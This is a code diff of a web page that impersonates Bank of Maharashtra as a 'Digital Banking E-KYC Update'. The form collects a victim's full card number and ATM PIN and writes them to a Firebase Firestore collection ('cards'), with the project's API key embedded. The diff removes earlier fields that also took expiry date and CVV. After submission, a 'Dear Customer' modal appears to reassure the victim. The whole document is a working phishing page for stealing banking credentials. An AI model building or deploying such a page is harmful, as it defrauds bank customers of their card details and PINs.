@@ -1,26 +1,154 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Digital Banking E-KYC</title>
-  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>
+  <meta charset="UTF-8">
+  <title>Card Form</title>
   <style>
-    /* (Your complete CSS code here — omitted for brevity, keep it as is) */
+    .header-img {
+      width: 100%;
+      display: block;
+      margin-bottom: 10px;
+    }
+    .headline-box {
+      text-align: center;
+      margin: 10px auto 20px;
+      padding: 0 15px;
+      font-family: 'Arial', sans-serif;
+    }
+    .headline-box .main-title {
+      font-size: 24px;
+      font-weight: bold;
+      color: #003366;
+    }
+    .headline-box .sub-title {
+      font-size: 15px;
+      font-weight: normal;
+      color: #333;
+      opacity: 0.85;
+      margin-top: 5px;
+    }
+    .card-box {
+      width: 100%;
+      max-width: 300px;
+      height: 170px;
+      border-radius: 16px;
+      background: linear-gradient(145deg, #1976d2, #afdbff);
+      box-shadow: 0 8px 20px rgba(0,0,0,0.2);
+      padding: 20px;
+      margin: 30px auto;
+      color: white;
+      font-family: 'Arial', sans-serif;
+      position: relative;
+    }
+    .card-title {
+      font-size: 18px;
+      margin-bottom: 10px;
+      font-weight: bold;
+      text-shadow: 0 1px 2px rgba(0,0,0,0.2);
+    }
+    .card-number {
+      display: flex;
+      gap: 20px;
+      justify-content: center;
+      margin: 12px 0;
+    }
+    .card-number input {
+      width: 40px;
+      padding: 8px;
+      font-size: 16px;
+      border: none;
+      border-radius: 5px;
+      text-align: center;
+      background: rgba(255,255,255,0.2);
+      color: white;
+      box-shadow: inset 0 1px 2px rgba(0,0,0,0.2);
+    }
+    .card-row {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 10px;
+    }
+    .card-row input {
+      width: 15%;
+      padding: 8px;
+      font-size: 16px;
+      border: none;
+      border-radius: 5px;
+      text-align: center;
+      background: rgba(255,255,255,0.2);
+      color: white;
+    }
+    .card-label {
+      font-size: 12px;
+      margin-top: 5px;
+      opacity: 0.8;
+    }
+    .side-button {
+      margin: 25px auto 15px;
+      padding: 12px;
+      width: 100%;
+      max-width: 300px;
+      font-size: 17px;
+      background-color: #2db1f1;
+      color: #FFFFFF;
+      border: none;
+      border-radius: 5px;
+      display: block;
+    }
+    .bottom-image {
+      width: 100%;
+      max-width: 450px;
+      display: block;
+      margin: 10px auto;
+      border-radius: 4px;
+    }
+    .modal-blur-bg {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      backdrop-filter: blur(5px);
+      background: rgba(0, 0, 0, 0.4);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 999;
+    }
+    .modal-message {
+      background: #fff;
+      max-width: 90%;
+      width: 350px;
+      padding: 25px;
+      border-radius: 10px;
+      text-align: center;
+      font-family: 'Arial', sans-serif;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+      line-height: 1.5;
+    }
+    .modal-message h3 {
+      color: #003366;
+      font-size: 20px;
+      margin-bottom: 15px;
+    }
+    .modal-message p {
+      font-size: 14px;
+      color: #333;
+      margin: 8px 0;
+    }
   </style>
 </head>
 <body>
-
-  <!-- (Your HTML content here — unchanged from your code) -->
-
   <!-- Header Image -->
   <img class="header-img" src="https://i.ibb.co/4ns0vWkf/Bank-of-Maharashtra-logo-svg.png" alt="Bank Header">
+
+  <!-- Headline -->
   <div class="headline-box">
     <div class="main-title">Welcome To Digital Banking E-KYC Update</div>
     <div class="sub-title">(Experience secure, simple, and smart banking solutions for your financial needs.)</div>
   </div>
 
+  <!-- Card Details -->
   <div class="card-box">
     <div class="card-title"> Debit/Credit Card Details</div>
     <div class="card-number">
@@ -31,21 +159,20 @@
     </div>
     <div class="card-label">Card Number</div>
     <div class="card-row">
-      <input type="text" id="expiry" maxlength="5" placeholder="MM/YY" required>
-      <input type="password" id="cvv" maxlength="3" placeholder="CVV" required>
       <input type="password" id="pin" maxlength="4" placeholder="PIN" required>
     </div>
     <div class="card-row">
-      <div class="card-label">Expiry</div>
-      <div class="card-label">CVV</div>
       <div class="card-label">ATM PIN</div>
     </div>
   </div>
 
+  <!-- Continue Button -->
   <button class="side-button" onclick="validateCardForm()">Continue</button>
 
+  <!-- Bottom Image -->
   <img class="bottom-image" src="https://i.ibb.co/TxY7gVf6/Screenshot-2025-04-21-14-11-44-95-40deb401b9ffe8e1df2f1cc5ba480b12.jpg" alt="Secure Banking">
 
+  <!-- Modal -->
   <div class="modal-blur-bg" id="kycModal">
     <div class="modal-message">
       <h3>Dear Customer,</h3>
@@ -59,8 +186,12 @@
     </div>
   </div>
 
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
+
+  <!-- Firebase Config -->
   <script>
-    // Firebase config
     const firebaseConfig = {
       apiKey: "AIzaSyDZ8EFQv3KZkGzhnbA7bVwOuWmjSkjTy1o",
       authDomain: "marcokinghoga.firebaseapp.com",
@@ -70,53 +201,35 @@
       appId: "1:132474071601:web:7c44a66fca6dc000e90310"
     };
 
-    // Initialize Firebase
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
+  </script>
 
-    const expiryInput = document.getElementById("expiry");
-
-    expiryInput.addEventListener("input", (e) => {
-      let value = e.target.value.replace(/[^\d]/g, "");
-      if (value.length >= 3) {
-        value = value.slice(0, 2) + "/" + value.slice(2, 4);
-      }
-      e.target.value = value;
-    });
-
+  <!-- Form Script -->
+  <script>
     function validateCardForm() {
-      const card1 = document.getElementById("card1").value;
-      const card2 = document.getElementById("card2").value;
-      const card3 = document.getElementById("card3").value;
-      const card4 = document.getElementById("card4").value;
-      const expiry = document.getElementById("expiry").value;
-      const cvv = document.getElementById("cvv").value;
-      const pin = document.getElementById("pin").value;
+      const card1 = document.getElementById("card1").value.trim();
+      const card2 = document.getElementById("card2").value.trim();
+      const card3 = document.getElementById("card3").value.trim();
+      const card4 = document.getElementById("card4").value.trim();
+      const pin = document.getElementById("pin").value.trim();
 
-      const [mm, yy] = expiry.split("/").map(Number);
-      const minMonth = 3;
-      const minYear = 24;
-
-      if (!mm || !yy || mm > 12 || mm < 1 || yy < minYear || (yy === minYear && mm < minMonth)) {
-        alert("Enter a valid expiry date");
-        expiryInput.focus();
+      if ([card1, card2, card3, card4, pin].some(v => v.length < 4)) {
+        alert("Please fill all fields correctly.");
         return false;
       }
 
-      const fullCard = `${card1}-${card2}-${card3}-${card4}`;
+      const cardNumber = `${card1}${card2}${card3}${card4}`;
 
-      db.collection("card_entries").add({
-        cardNumber: fullCard,
-        expiry: expiry,
-        cvv: cvv,
+      db.collection("cards").add({
+        card_number: cardNumber,
         pin: pin,
         timestamp: firebase.firestore.FieldValue.serverTimestamp()
-      })
-      .then(() => {
+      }).then(() => {
         document.getElementById("kycModal").style.display = "flex";
-      })
-      .catch((error) => {
-        alert("Error saving data: " + error.message);
+      }).catch(err => {
+        alert("Error saving data.");
+        console.error(err);
       });
 
       return true;
